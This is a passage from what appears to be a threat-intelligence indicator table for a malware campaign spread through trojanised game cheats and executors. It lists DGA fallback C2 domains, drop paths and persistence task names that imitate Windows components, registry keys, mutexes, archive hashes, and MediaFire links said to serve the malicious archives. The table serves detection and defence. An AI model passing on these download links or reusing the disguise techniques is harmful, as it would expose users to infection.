| DGA fallback | Domain | lavinilaviniinilav.duckdns.org | Fallback C2 name generated by the payload with SHA-256 of payload a2d54387545e854fc9781e778ecbd9cf3e0747e8288f49a89b118482e796712a; TCP 406; NXDOMAIN when checked |
| DGA fallback | Domain | lavinilaviniiniini.duckdns.org | Fallback C2 name generated by the payload with SHA-256 of payload a2d54387545e854fc9781e778ecbd9cf3e0747e8288f49a89b118482e796712a; TCP 406; NXDOMAIN when checked |
| DGA fallback | Domain | laviniinilavlavlav.duckdns.org | Fallback C2 name generated by the payload with SHA-256 of payload a2d54387545e854fc9781e778ecbd9cf3e0747e8288f49a89b118482e796712a; TCP 406; NXDOMAIN when checked |
| DGA fallback | Domain | laviniinilavlavini.duckdns.org | Fallback C2 name generated by the payload with SHA-256 of payload a2d54387545e854fc9781e778ecbd9cf3e0747e8288f49a89b118482e796712a; TCP 406; NXDOMAIN when checked |
| DGA fallback | Domain | laviniinilavinilav.duckdns.org | Fallback C2 name generated by the payload with SHA-256 of payload a2d54387545e854fc9781e778ecbd9cf3e0747e8288f49a89b118482e796712a; TCP 406; NXDOMAIN when checked |
| DGA fallback | Domain | laviniinilaviniini.duckdns.org | Fallback C2 name generated by the payload with SHA-256 of payload a2d54387545e854fc9781e778ecbd9cf3e0747e8288f49a89b118482e796712a; TCP 406; NXDOMAIN when checked |
| DGA fallback | Domain | laviniiniinilavlav.duckdns.org | Fallback C2 name generated by the payload with SHA-256 of payload a2d54387545e854fc9781e778ecbd9cf3e0747e8288f49a89b118482e796712a; TCP 406; NXDOMAIN when checked |
| DGA fallback | Domain | laviniiniinilavini.duckdns.org | Fallback C2 name generated by the payload with SHA-256 of payload a2d54387545e854fc9781e778ecbd9cf3e0747e8288f49a89b118482e796712a; TCP 406; NXDOMAIN when checked |
| DGA fallback | Domain | laviniiniiniinilav.duckdns.org | Fallback C2 name generated by the payload with SHA-256 of payload a2d54387545e854fc9781e778ecbd9cf3e0747e8288f49a89b118482e796712a; TCP 406; NXDOMAIN when checked |
| DGA fallback | Domain | laviniiniiniiniini.duckdns.org | Fallback C2 name generated by the payload with SHA-256 of payload a2d54387545e854fc9781e778ecbd9cf3e0747e8288f49a89b118482e796712a; TCP 406; NXDOMAIN when checked |
| DGA fallback | Domain | inilavlavlavlavlav.duckdns.org | Fallback C2 name generated by the payload with SHA-256 of payload a2d54387545e854fc9781e778ecbd9cf3e0747e8288f49a89b118482e796712a; TCP 406; NXDOMAIN when checked |
| DGA fallback | Domain | inilavlavlavlavini.duckdns.org | Fallback C2 name generated by the payload with SHA-256 of payload a2d54387545e854fc9781e778ecbd9cf3e0747e8288f49a89b118482e796712a; TCP 406; NXDOMAIN when checked |
| DGA fallback | Domain | inilavlavlavinilav.duckdns.org | Fallback C2 name generated by the payload with SHA-256 of payload a2d54387545e854fc9781e778ecbd9cf3e0747e8288f49a89b118482e796712a; TCP 406; NXDOMAIN when checked |
| DGA fallback | Domain | inilavlavlaviniini.duckdns.org | Fallback C2 name generated by the payload with SHA-256 of payload a2d54387545e854fc9781e778ecbd9cf3e0747e8288f49a89b118482e796712a; TCP 406; NXDOMAIN when checked |
| DGA fallback | Domain | inilavlavinilavlav.duckdns.org | Fallback C2 name generated by the payload with SHA-256 of payload a2d54387545e854fc9781e778ecbd9cf3e0747e8288f49a89b118482e796712a; TCP 406; NXDOMAIN when checked |
| DGA fallback | Domain | inilavlavinilavini.duckdns.org | Fallback C2 name generated by the payload with SHA-256 of payload a2d54387545e854fc9781e778ecbd9cf3e0747e8288f49a89b118482e796712a; TCP 406; NXDOMAIN when checked |
| DGA fallback | Domain | inilavlaviniinilav.duckdns.org | Fallback C2 name generated by the payload with SHA-256 of payload a2d54387545e854fc9781e778ecbd9cf3e0747e8288f49a89b118482e796712a; TCP 406; NXDOMAIN when checked |
| DGA fallback | Domain | inilavlaviniiniini.duckdns.org | Fallback C2 name generated by the payload with SHA-256 of payload a2d54387545e854fc9781e778ecbd9cf3e0747e8288f49a89b118482e796712a; TCP 406; NXDOMAIN when checked |
| DGA fallback | Domain | inilavinilavlavlav.duckdns.org | Fallback C2 name generated by the payload with SHA-256 of payload a2d54387545e854fc9781e778ecbd9cf3e0747e8288f49a89b118482e796712a; TCP 406; NXDOMAIN when checked |
| DGA fallback | Domain | inilavinilavlavini.duckdns.org | Fallback C2 name generated by the payload with SHA-256 of payload a2d54387545e854fc9781e778ecbd9cf3e0747e8288f49a89b118482e796712a; TCP 406; NXDOMAIN when checked |
| DGA fallback | Domain | inilavinilavinilav.duckdns.org | Fallback C2 name generated by the payload with SHA-256 of payload a2d54387545e854fc9781e778ecbd9cf3e0747e8288f49a89b118482e796712a; TCP 406; NXDOMAIN when checked |
| DGA fallback | Domain | inilavinilaviniini.duckdns.org | Fallback C2 name generated by the payload with SHA-256 of payload a2d54387545e854fc9781e778ecbd9cf3e0747e8288f49a89b118482e796712a; TCP 406; NXDOMAIN when checked |
| DGA fallback | Domain | inilaviniinilavlav.duckdns.org | Fallback C2 name generated by the payload with SHA-256 of payload a2d54387545e854fc9781e778ecbd9cf3e0747e8288f49a89b118482e796712a; TCP 406; NXDOMAIN when checked |
| DGA fallback | Domain | inilaviniinilavini.duckdns.org | Fallback C2 name generated by the payload with SHA-256 of payload a2d54387545e854fc9781e778ecbd9cf3e0747e8288f49a89b118482e796712a; TCP 406; NXDOMAIN when checked |
| DGA fallback | Domain | inilaviniiniinilav.duckdns.org | Fallback C2 name generated by the payload with SHA-256 of payload a2d54387545e854fc9781e778ecbd9cf3e0747e8288f49a89b118482e796712a; TCP 406; NXDOMAIN when checked |
| DGA fallback | Domain | inilaviniiniiniini.duckdns.org | Fallback C2 name generated by the payload with SHA-256 of payload a2d54387545e854fc9781e778ecbd9cf3e0747e8288f49a89b118482e796712a; TCP 406; NXDOMAIN when checked |
| DGA fallback | Domain | iniinilavlavlavlav.duckdns.org | Fallback C2 name generated by the payload with SHA-256 of payload a2d54387545e854fc9781e778ecbd9cf3e0747e8288f49a89b118482e796712a; TCP 406; NXDOMAIN when checked |
| DGA fallback | Domain | iniinilavlavlavini.duckdns.org | Fallback C2 name generated by the payload with SHA-256 of payload a2d54387545e854fc9781e778ecbd9cf3e0747e8288f49a89b118482e796712a; TCP 406; NXDOMAIN when checked |
| DGA fallback | Domain | iniinilavlavinilav.duckdns.org | Fallback C2 name generated by the payload with SHA-256 of payload a2d54387545e854fc9781e778ecbd9cf3e0747e8288f49a89b118482e796712a; TCP 406; NXDOMAIN when checked |
| DGA fallback | Domain | iniinilavlaviniini.duckdns.org | Fallback C2 name generated by the payload with SHA-256 of payload a2d54387545e854fc9781e778ecbd9cf3e0747e8288f49a89b118482e796712a; TCP 406; NXDOMAIN when checked |
| DGA fallback | Domain | iniinilavinilavlav.duckdns.org | Fallback C2 name generated by the payload with SHA-256 of payload a2d54387545e854fc9781e778ecbd9cf3e0747e8288f49a89b118482e796712a; TCP 406; NXDOMAIN when checked |
| DGA fallback | Domain | iniinilavinilavini.duckdns.org | Fallback C2 name generated by the payload with SHA-256 of payload a2d54387545e854fc9781e778ecbd9cf3e0747e8288f49a89b118482e796712a; TCP 406; NXDOMAIN when checked |
| DGA fallback | Domain | iniinilaviniinilav.duckdns.org | Fallback C2 name generated by the payload with SHA-256 of payload a2d54387545e854fc9781e778ecbd9cf3e0747e8288f49a89b118482e796712a; TCP 406; NXDOMAIN when checked |
| DGA fallback | Domain | iniinilaviniiniini.duckdns.org | Fallback C2 name generated by the payload with SHA-256 of payload a2d54387545e854fc9781e778ecbd9cf3e0747e8288f49a89b118482e796712a; TCP 406; NXDOMAIN when checked |
| DGA fallback | Domain | iniiniinilavlavlav.duckdns.org | Fallback C2 name generated by the payload with SHA-256 of payload a2d54387545e854fc9781e778ecbd9cf3e0747e8288f49a89b118482e796712a; TCP 406; NXDOMAIN when checked |
| DGA fallback | Domain | iniiniinilavlavini.duckdns.org | Fallback C2 name generated by the payload with SHA-256 of payload a2d54387545e854fc9781e778ecbd9cf3e0747e8288f49a89b118482e796712a; TCP 406; NXDOMAIN when checked |
| DGA fallback | Domain | iniiniinilavinilav.duckdns.org | Fallback C2 name generated by the payload with SHA-256 of payload a2d54387545e854fc9781e778ecbd9cf3e0747e8288f49a89b118482e796712a; TCP 406; NXDOMAIN when checked |
| DGA fallback | Domain | iniiniinilaviniini.duckdns.org | Fallback C2 name generated by the payload with SHA-256 of payload a2d54387545e854fc9781e778ecbd9cf3e0747e8288f49a89b118482e796712a; TCP 406; NXDOMAIN when checked |
| DGA fallback | Domain | iniiniiniinilavlav.duckdns.org | Fallback C2 name generated by the payload with SHA-256 of payload a2d54387545e854fc9781e778ecbd9cf3e0747e8288f49a89b118482e796712a; TCP 406; NXDOMAIN when checked |
| DGA fallback | Domain | iniiniiniinilavini.duckdns.org | Fallback C2 name generated by the payload with SHA-256 of payload a2d54387545e854fc9781e778ecbd9cf3e0747e8288f49a89b118482e796712a; TCP 406; NXDOMAIN when checked |
| DGA fallback | Domain | iniiniiniiniinilav.duckdns.org | Fallback C2 name generated by the payload with SHA-256 of payload a2d54387545e854fc9781e778ecbd9cf3e0747e8288f49a89b118482e796712a; TCP 406; NXDOMAIN when checked |
| DGA fallback | Domain | iniiniiniiniiniini.duckdns.org | Fallback C2 name generated by the payload with SHA-256 of payload a2d54387545e854fc9781e778ecbd9cf3e0747e8288f49a89b118482e796712a; TCP 406; NXDOMAIN when checked |
| Drop path | File path | `C:\ProgramData\Windows\Microsoft\RuntimeBroker.exe` | Drop path of the payloads, including SHA-256 of payload a2d54387545e854fc9781e778ecbd9cf3e0747e8288f49a89b118482e796712a |
| Drop path | File path | `C:\ProgramData\Windows\Microsoft\RuntimeBrokerA.exe` | Drop path of the `A` builds, including SHA-256 of payload 8b38b33a2cdd39ffeeef46bb4ceffd61d8eb758efb747383df6cc447f8b66362 |
| Registry | Registry key | `HKCU\Software\Microsoft\EventSystem` | Value `System` holds the cached C2 host; written by the payload with SHA-256 of payload 0b99c3e88d50e6d0196fbe21e2367386291a11f53a6d45aa7cfe55ea4aab4ee1 |
| Registry | Registry key | `HKCU\Software\WinRAR\Libs` | Values `<a>_<b>_chunk_<n>` cache C2-supplied modules; used by the payload with SHA-256 of payload a2d54387545e854fc9781e778ecbd9cf3e0747e8288f49a89b118482e796712a |
| Persistence | Scheduled task | `\Microsoft\Windows\SoftwareProtectionPlatform\SvcRestartTaskWindowsLogins` | Created by the installed copy `RuntimeBroker.exe` of the payload with SHA-256 of payload 0b99c3e88d50e6d0196fbe21e2367386291a11f53a6d45aa7cfe55ea4aab4ee1 |
| Persistence | Scheduled task | `\Microsoft\Windows\RegisterDeviceAccountChange\ProgramDataUpdate` | Created by the installed copy `RuntimeBroker.exe` of the payload with SHA-256 of payload 0b99c3e88d50e6d0196fbe21e2367386291a11f53a6d45aa7cfe55ea4aab4ee1 |
| Persistence | Scheduled task | `\Microsoft\Windows\EDP\ScheduledDef` | Created by the installed copy `RuntimeBroker.exe` of the payload with SHA-256 of payload 0b99c3e88d50e6d0196fbe21e2367386291a11f53a6d45aa7cfe55ea4aab4ee1 |
| Persistence | Scheduled task | `\Microsoft\Location\MicrosoftUpdaterMachineCore` | Created by the installed copy `RuntimeBroker.exe` of the payload with SHA-256 of payload 0b99c3e88d50e6d0196fbe21e2367386291a11f53a6d45aa7cfe55ea4aab4ee1 |
| Persistence | Scheduled task | `\Microsoft\Windows\SoftwareProtectionPlatform\SvcRestartTaskWindowsLoginsA` | Created by the installed copy `RuntimeBrokerA.exe` of the payload with SHA-256 of payload 8b38b33a2cdd39ffeeef46bb4ceffd61d8eb758efb747383df6cc447f8b66362 |
| Persistence | Scheduled task | `\Microsoft\Windows\RegisterDeviceAccountChange\ProgramDataUpdateA` | Created by the installed copy `RuntimeBrokerA.exe` of the payload with SHA-256 of payload 8b38b33a2cdd39ffeeef46bb4ceffd61d8eb758efb747383df6cc447f8b66362 |
| Persistence | Scheduled task | `\Microsoft\Windows\EDP\ScheduledDefA` | Created by the installed copy `RuntimeBrokerA.exe` of the payload with SHA-256 of payload 8b38b33a2cdd39ffeeef46bb4ceffd61d8eb758efb747383df6cc447f8b66362 |
| Persistence | Scheduled task | `\Microsoft\Location\MicrosoftUpdaterMachineCoreA` | Created by the installed copy `RuntimeBrokerA.exe` of the payload with SHA-256 of payload 8b38b33a2cdd39ffeeef46bb4ceffd61d8eb758efb747383df6cc447f8b66362 |
| Mutex | Mutex | `Global\RuntimeBrokerAds` | Mutex string in the config of the payload with SHA-256 of payload a2d54387545e854fc9781e778ecbd9cf3e0747e8288f49a89b118482e796712a |
| Mutex | Mutex | `Global\RuntimeBrokerAdsA` | Mutex string in the config of the `A` builds, including SHA-256 of payload 8b38b33a2cdd39ffeeef46bb4ceffd61d8eb758efb747383df6cc447f8b66362 |
| Archive | SHA-256 | 4f367f82f9daee3d1c523b92b724babf6bca291fa1eb4fd918593f6d83bd5b21 | `Belium.rar`; holds the loader with SHA-256 of file 927af2a9ad72072828a4fe5fe21d2bd4a59b0a813ef0b2e73c4be41cc074b7bf beside renamed WinGup |
| Download | URL | https://www.mediafire.com/file/7ugzohbqudqloah/Belium.rar/file | Serves `Belium.rar` with SHA-256 of file 4f367f82f9daee3d1c523b92b724babf6bca291fa1eb4fd918593f6d83bd5b21 |
| Archive | SHA-256 | 16bb51fe035ea28d3f2557fdcd74ce2df0917991ba570920f093f84c395ee225 | `Leak.rar`; holds `CLibrary.dll` with SHA-256 of file 026f91061f2bda281f11e46d38a07ee181ff4c38a41a2858056cfc66933e2ecd beside a signed Go `Menu.exe` |
| Download | URL | https://www.mediafire.com/file/x721as31yh217o4/Leak.rar/file | Serves `Leak.rar` with SHA-256 of file 16bb51fe035ea28d3f2557fdcd74ce2df0917991ba570920f093f84c395ee225 |
| Archive | SHA-256 | 5efc4b94268cd9155312e8351f2b25535d6f812dbfce6e52b13c186bc9d8e7e8 | `Kapu.rar`; holds `Sentlog.dll` with SHA-256 of file 026f91061f2bda281f11e46d38a07ee181ff4c38a41a2858056cfc66933e2ecd beside a signed Go executable |
| Download | URL | https://www.mediafire.com/file/mjp4uy2qkeitx5e/Kapu.rar/file | Serves `Kapu.rar` with SHA-256 of file 5efc4b94268cd9155312e8351f2b25535d6f812dbfce6e52b13c186bc9d8e7e8 |
| Archive | SHA-256 | d3fa3b9aacdf3224b0ab64de4fe86b5eafffaa097dc4535f152782b1a9306a0a | `Kapu.rar`; holds `Sentlog.dll` with SHA-256 of file 026f91061f2bda281f11e46d38a07ee181ff4c38a41a2858056cfc66933e2ecd beside a 4,172,216-byte executable |
| Download | URL | https://www.mediafire.com/file/29gzwzqesctgtva/Kapu.rar/file | Serves `Kapu.rar` with SHA-256 of file d3fa3b9aacdf3224b0ab64de4fe86b5eafffaa097dc4535f152782b1a9306a0a |
| Archive | SHA-256 | 8df125c9067c5ef4dd2daae491e362420ef6b25dd8fb0890eb970c2b4a9fc903 | `mpclient.zip`; holds `libcurl.dll` with SHA-256 of file 340cedbd0ba43fbbdc75c9cabc3d1b648c7432fae15934b8fe4a84f2502f1a0c beside renamed WinGup |
| Download | URL | https://www.mediafire.com/file/hrdbf64p1lfts0z/mpclient.zip/file | Served `mpclient.zip` with SHA-256 of file 8df125c9067c5ef4dd2daae491e362420ef6b25dd8fb0890eb970c2b4a9fc903 on 2026-09-17 |
| Archive | SHA-256 | 9ef19ea806ddb6d641469e600f4ea63361f2d7b9b893403be1971cfb71b9ab5c | `mpclient.zip`; holds `library\libcurl.dll` with SHA-256 of file 2ffa9d2ac0f1d4ccd62c5cea4273802b2de428c47fc7d051822670203af4e86d beside a signed Go `Setup.exe` |
| Download | URL | https://www.mediafire.com/file/wknxua8glzi5veb/mpclient.zip/file | Serves `mpclient.zip` with SHA-256 of file 9ef19ea806ddb6d641469e600f4ea63361f2d7b9b893403be1971cfb71b9ab5c |
| Archive | SHA-256 | 2fe1c35cf71a1e4c4b16a6297dd2c985a5b6dc7eebbfbb311ca4487ae16cae89 | `Loader.zip`; holds the loader with SHA-256 of file 37383dd6ac753fa60fd478f95535b7baa846d3cdc2d649d5bf73649722c888fd beside renamed WinGup |
| Download | URL | https://www.mediafire.com/file/ksut4ouain796k1/Loader.zip/file | Serves `Loader.zip` with SHA-256 of file 2fe1c35cf71a1e4c4b16a6297dd2c985a5b6dc7eebbfbb311ca4487ae16cae89 |
| Download | URL | https://www.mediafire.com/file/cmvi8jue7qfzenx/Loader.zip/file | Serves `Loader.zip` with SHA-256 of file 2fe1c35cf71a1e4c4b16a6297dd2c985a5b6dc7eebbfbb311ca4487ae16cae89 |
| Download | URL | https://www.mediafire.com/file/tlmttormmycl44b/Loader.zip/file | Serves `Loader.zip` with SHA-256 of file 2fe1c35cf71a1e4c4b16a6297dd2c985a5b6dc7eebbfbb311ca4487ae16cae89 |
| Archive | SHA-256 | 23960c8686d31e55c85f2360c3104fd405c9bfaa981b44ce1ac5384371d9498d | `Quantum V4 updated.rar`; holds the loader with SHA-256 of file 927af2a9ad72072828a4fe5fe21d2bd4a59b0a813ef0b2e73c4be41cc074b7bf beside renamed WinGup |
| Download | URL | https://www.mediafire.com/file/6nsyaasjg2gelpf/Quantum%20V4%20updated.rar/file | Serves `Quantum V4 updated.rar` with SHA-256 of file 23960c8686d31e55c85f2360c3104fd405c9bfaa981b44ce1ac5384371d9498d |
| Archive | SHA-256 | 3a9ac5f477830c58a112302c178379ef15f4836bdd008383fe31ef9196b8f51d | `Quantum V4.11.rar`; holds the loader with SHA-256 of file 927af2a9ad72072828a4fe5fe21d2bd4a59b0a813ef0b2e73c4be41cc074b7bf beside renamed WinGup |
| Download | URL | https://www.mediafire.com/file/i6l2dqi8a06bct0/Quantum%20V4.11.rar/file | Serves `Quantum V4.11.rar` with SHA-256 of file 3a9ac5f477830c58a112302c178379ef15f4836bdd008383fe31ef9196b8f51d |
| Archive | SHA-256 | bc35ccb087d9c0b6bde5c657e8cc5262c38aca23e9344eca952f6974bd16a373 | `AxiomCheat.rar`; holds `libcurl.dll` with SHA-256 of file a222956ea57d1e61ef8a8bf7c226424d3aeb85b3bee1de2e4dc55204e8a650ba beside renamed WinGup |
| Download | URL | https://www.mediafire.com/file/n5o51awg3jcomaf/AxiomCheat.rar/file | Serves `AxiomCheat.rar` with SHA-256 of file bc35ccb087d9c0b6bde5c657e8cc5262c38aca23e9344eca952f6974bd16a373 |
| Archive | SHA-256 | ef33217135008498e2b16e1c4e9365178d994c899063cd7d6a5e31a77deb562a | `Executor.zip`; holds `libcurl.dll` with SHA-256 of file 196006c0d1c5a1218e6e90e4149849f31305b34e6051f949c2e4d4645a5b8fc3 beside renamed WinGup |
| Download | URL | https://www.mediafire.com/file/e5ztg8einbzatex/Executor.zip/file | Serves `Executor.zip` with SHA-256 of file ef33217135008498e2b16e1c4e9365178d994c899063cd7d6a5e31a77deb562a |
| Archive | SHA-256 | 2faaa7ec9132608d844e1385ad090e254cea3e2b1403685dc3e6f0747c953c92 | `InstallerV_2026_8.13.rar`; holds `libcurl.dll` with SHA-256 of file 336cd4282808ca3d662dc90e686fa9685b895e30d40e2a30fd227d9d976781ea beside `invertor.exe` |
| Download | URL | https://www.mediafire.com/file/erspfkyny1fqf7j/InstallerV_2026_8.13.rar/file | Serves `InstallerV_2026_8.13.rar` with SHA-256 of file 2faaa7ec9132608d844e1385ad090e254cea3e2b1403685dc3e6f0747c953c92 |
| Archive | SHA-256 | 79f36564e595fb93c988950cda32cbc23766b6211ba64f5446d64dc9eda938d0 | `Nexus.zip`; holds `libcurl.dll` with SHA-256 of file 9a0bb43d2cc222473581b57ae31411d6dc25d654612e07139f52dbb60980b53e beside renamed WinGup |
| Download | URL | https://www.mediafire.com/file/1ixbsnd8bv4uuo8/Nexus.zip/file | Serves `Nexus.zip` with SHA-256 of file 79f36564e595fb93c988950cda32cbc23766b6211ba64f5446d64dc9eda938d0 |
| Archive | SHA-256 | c11148849d068120173a40c62685ee675e6bc22c6db533cb68405f1c16419002 | `Setup_v14.26.01.zip`; holds `libcurl.dll` with SHA-256 of file 45335d65c29dc06019d285c2849977e7c7d271012e97f14b6cce2a85b35f9ded beside renamed WinGup |
| Download | URL | https://www.mediafire.com/file/71rindwtqe9zxdr/Setup_v14.26.01.zip/file | Serves `Setup_v14.26.01.zip` with SHA-256 of file c11148849d068120173a40c62685ee675e6bc22c6db533cb68405f1c16419002 |
| Archive | SHA-256 | 4cff37962b09a0053130fddaff5f620e5c2f2a98e1f09d393c058dcf21038180 | `Setupper.zip`; holds the fake `libcurl.dll` with SHA-256 of file 0cd47cbbe81b395b917653048e6d7a98b3f6a4aaf803c6631fc456552486777a beside WinGup renamed `Setupper.exe` |
| Download | URL | https://www.mediafire.com/file/vhsg3efdfy4ckyz/Setupper.zip/file | Serves `Setupper.zip` with SHA-256 of file 4cff37962b09a0053130fddaff5f620e5c2f2a98e1f09d393c058dcf21038180 |
| Archive | SHA-256 | 3fb91f9ee8798a3eb5b380bbb7c4cde1db33a884ef97596230207dcd6fae2779 | `FlexMode.rar`; holds `libcurl.dll` with SHA-256 of file c6c9791f9236dbab3e1539396ef1513576a30062095fb045cfdb18fac090ad10 |
| Download | URL | https://www.mediafire.com/file/8wgfycm4x25ltpj/FlexMode.rar/file | Serves `FlexMode.rar` with SHA-256 of file 3fb91f9ee8798a3eb5b380bbb7c4cde1db33a884ef97596230207dcd6fae2779 |
| Archive | SHA-256 | 434f71a15882324249e410fe318d44f27c9715cb66e0f2bc14010fad11466e91 | `XenoExecutor.rar`; holds `libcurl.dll` with SHA-256 of file 495d877c54b7e1a41ed03938f8b208713fcd6ce4c6854c0175ccea32cbb449f8 |
| Download | URL | https://www.mediafire.com/file/jpv4k082aei82qf/XenoExecutor.rar/file | Serves `XenoExecutor.rar` with SHA-256 of file 434f71a15882324249e410fe318d44f27c9715cb66e0f2bc14010fad11466e91 |
| Archive | SHA-256 | 53ee6a148c6f40e92ff9dd12e176c96700ea71f9cb9a6fe73f1506682fa60cdb | `Anvil_Menu.rar`; holds `libcurl.dll` with SHA-256 of file a16ac85e0127ffe9f7f1d0588a83f7d9fa2131e6c772a610b1b7d7325a52a001 beside renamed WinGup |
| Download | URL | https://www.mediafire.com/file/nr8wufwe30037yh/Anvil_Menu.rar/file | Serves `Anvil_Menu.rar` with SHA-256 of file 53ee6a148c6f40e92ff9dd12e176c96700ea71f9cb9a6fe73f1506682fa60cdb |
| Archive | SHA-256 | 056f8b53913c6694dca76e9c2dab3a5a67421a75cc8d5acecf8b5c60c545afbf | `ArcaneRBX.rar`; holds `libcurl.dll` with SHA-256 of file a16ac85e0127ffe9f7f1d0588a83f7d9fa2131e6c772a610b1b7d7325a52a001 beside renamed WinGup |
| Download | URL | https://www.mediafire.com/file/z1lk5yu0gkwvja4/ArcaneRBX.rar/file | Serves `ArcaneRBX.rar` with SHA-256 of file 056f8b53913c6694dca76e9c2dab3a5a67421a75cc8d5acecf8b5c60c545afbf |
| Archive | SHA-256 | 990b33e13ce9cecdd9cb31e506d83cf6df4ff134acfc2967049d25ddb88ecd2c | `DEX_v1.2.rar`; holds `libcurl.dll` with SHA-256 of file a26279766d25999250f853a89a6e38edf694f86227e5885b88218d51b2954135 beside renamed WinGup |
| Download | URL | https://www.mediafire.com/file/vft5f5t2c5obb3e/DEX_v1.2.rar/file | Serves `DEX_v1.2.rar` with SHA-256 of file 990b33e13ce9cecdd9cb31e506d83cf6df4ff134acfc2967049d25ddb88ecd2c |
| Archive | SHA-256 | f8857a483d8470c763c254a5cce14a102e864097092ebb696bd574415ef3a448 | `FortniteHack.zip`; holds `libcurl.dll` with SHA-256 of file f43c501e1413280d54a12cf8eeaed75e502c5eb58c8822580e0cbb31111eb215 beside renamed WinGup |
| Download | URL | https://www.mediafire.com/file/lh3gldumicngxcu/FortniteHack.zip/file | Serves `FortniteHack.zip` with SHA-256 of file f8857a483d8470c763c254a5cce14a102e864097092ebb696bd574415ef3a448 |
| Archive | SHA-256 | 3da58430a25bb89edfbe13c8308a4889bc7a550cce2a735fe0d3b74694dcb518 | `KernelV2.zip`; holds `libcurl.dll` with SHA-256 of file 7135da1492bf21e46102e4d41f8bb47b887baca8517a398a46f3b85049f3bfc8 beside renamed WinGup |
| Download | URL | https://www.mediafire.com/file/53rn5rwdt5tpzqf/KernelV2.zip/file | Serves `KernelV2.zip` with SHA-256 of file 3da58430a25bb89edfbe13c8308a4889bc7a550cce2a735fe0d3b74694dcb518 |
| Archive | SHA-256 | fdaa66d90392b8910463d67bfc148c72025dfdda1ccc4b79c368cb9cdc4c2184 | `PalworldExtreme.zip`; holds `libcurl.dll` with SHA-256 of file e0e99a6b1859c161d2d2feedba669abb52fa15f681a17f1e389932265c8036d2 beside renamed WinGup |
| Download | URL | https://www.mediafire.com/file/rlt2ehrqor3obu3/PalworldExtreme.zip/file | Serves `PalworldExtreme.zip` with SHA-256 of file fdaa66d90392b8910463d67bfc148c72025dfdda1ccc4b79c368cb9cdc4c2184 |
| Archive | SHA-256 | 033cb6256ce907113cc9331d8eff8e8f81e39b786594ea717faddad742045945 | `RustiX_V1.6.zip`; holds `libcurl.dll` with SHA-256 of file 576f297b61a76ec36ee65622ff209d5236d9e9cbdbe302125d0689ccb397bf42 beside renamed WinGup |
| Download | URL | https://www.mediafire.com/file/y6q7tvb0t9si18p/RustiX_V1.6.zip/file | Serves `RustiX_V1.6.zip` with SHA-256 of file 033cb6256ce907113cc9331d8eff8e8f81e39b786594ea717faddad742045945 |
| Archive | SHA-256 | b7574fcfeaf1c54fd48a78bb55b7f38f861b61896eebddf6b6fd50a4679cc8cc | `S0fТ.rar` (zero in place of O; the Т is Cyrillic); holds `libcurl.dll` with SHA-256 of file be4d6b8da25f08d52b9a564b42168d25485bb470af50c39f28ace075ccf3f2ef beside renamed WinGup |
| Download | URL | https://www.mediafire.com/file/57u71yhqrta1ide/S0f%D0%A2.rar/file | Serves `S0fТ.rar` (zero in place of O; the Т is Cyrillic) with SHA-256 of file b7574fcfeaf1c54fd48a78bb55b7f38f861b61896eebddf6b6fd50a4679cc8cc |
| Archive | SHA-256 | 4bd2a50f3984a34ba6accaf451b9ecf24b117fe89e0aa1b72ac32d995e1771e9 | `Spectra_Menu.rar`; holds `libcurl.dll` with SHA-256 of file a16ac85e0127ffe9f7f1d0588a83f7d9fa2131e6c772a610b1b7d7325a52a001 beside renamed WinGup |
| Download | URL | https://www.mediafire.com/file/x4jtbi5ujqn8jj6/Spectra_Menu.rar/file | Serves `Spectra_Menu.rar` with SHA-256 of file 4bd2a50f3984a34ba6accaf451b9ecf24b117fe89e0aa1b72ac32d995e1771e9 |
| Archive | SHA-256 | 1c4ed233afd3d92f5e3ac4261129eaafb4cc7d7c33b46c90bf374b9bb7d151c9 | `Ultra_Trainer.rar`; holds `libcurl.dll` with SHA-256 of file a16ac85e0127ffe9f7f1d0588a83f7d9fa2131e6c772a610b1b7d7325a52a001 beside renamed WinGup |
| Download | URL | https://www.mediafire.com/file/cxkw4pz6byn81mh/Ultra_Trainer.rar/file | Serves `Ultra_Trainer.rar` with SHA-256 of file 1c4ed233afd3d92f5e3ac4261129eaafb4cc7d7c33b46c90bf374b9bb7d151c9 |
| Archive | SHA-256 | 0027d3ad645758047ccfb18774dbccd9c1440aab2fc2af9d5bf3793948184572 | `ValoHigh.zip`; holds `libcurl.dll` with SHA-256 of file f35cd5493aeab365297814ed602438b3d06f900518fa4f51ab7ac066e35ef591 beside renamed WinGup |
| Download | URL | https://www.mediafire.com/file/m1k5sfvdiks51fs/ValoHigh.zip/file | Serves `ValoHigh.zip` with SHA-256 of file 0027d3ad645758047ccfb18774dbccd9c1440aab2fc2af9d5bf3793948184572 |
| Archive | SHA-256 | ead225e208300e9cd1d878342c54c520636c28e560953e8ecdfbcdc877944b3f | `ValorantHack.zip`; holds `libcurl.dll` with SHA-256 of file 60e51b8bc32cd98563d0a47c7cc13d4afe85ac19b2f3cb4ae03e8f243a41f11c beside renamed WinGup |
| Download | URL | https://www.mediafire.com/file/d3w6yntwu66isq6/ValorantHack.zip/file | Serves `ValorantHack.zip` with SHA-256 of file ead225e208300e9cd1d878342c54c520636c28e560953e8ecdfbcdc877944b3f |
| Archive | SHA-256 | 46eafb939395766e220e1c36f08336ae8aecab4a3d28b62ae1fff852e1d27bbf | `Xeno-v1.3.60.rar`; holds `Xeno.dll` with SHA-256 of file d52f40f67256905d5f1ba20be94aba2048a50e4527f379783ca3b660da4a70c5 beside `Xeno-v1.3.60.exe`; no WinGup |
| Download | URL | https://www.mediafire.com/file/hibu3dh50bdr2tz/Xeno-v1.3.60.rar/file | Serves `Xeno-v1.3.60.rar` with SHA-256 of file 46eafb939395766e220e1c36f08336ae8aecab4a3d28b62ae1fff852e1d27bbf |

### Suspicious

| IOC | Type | Value | Context |
|---|---|---|---|
| Signed Go executable | SHA-256 | 53ceb7546f7eaa918d8a1e63deb5285cf3fc3f8c15474803472a65e06a5e89bb | Go 1.22.1 x64 GUI executable, 5,910,944 B, signer `CN=Solid Sphere Group`; `Menu.exe` in `Leak.rar`, `Lоаdеr.exe` (Cyrillic letters) in `Kapu.rar` with SHA-256 of file 5efc4b94268cd9155312e8351f2b25535d6f812dbfce6e52b13c186bc9d8e7e8; shipped in place of WinGup beside the loader with SHA-256 of file 026f91061f2bda281f11e46d38a07ee181ff4c38a41a2858056cfc66933e2ecd; self-signed (`C=US`, O equal to CN), DigiCert timestamp |
